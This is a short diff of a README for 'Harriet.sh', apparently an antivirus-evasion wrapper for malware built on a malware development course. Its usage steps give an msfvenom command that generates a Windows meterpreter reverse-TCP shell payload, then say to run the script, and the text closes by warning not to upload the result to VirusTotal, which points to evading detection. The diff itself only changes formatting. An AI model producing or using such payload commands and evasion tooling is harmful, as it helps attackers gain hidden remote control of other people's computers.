@@ -26,11 +26,13 @@ The majority of this script was taken from the Sektor 7 Malware Development cour
 **Usage:** 
 
 Create Your Payload
+
 **msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=IP lport=PORT -f raw > msfr.bin**
 
 Run the Script
+
 **bash Harriet.sh **
 
 Fill In The Values As Prompted
 
-Enjoy and don't upload to Virus Total!!!!!
+**Enjoy and DON'T UPLOAD TO Virus Total!!!!!**
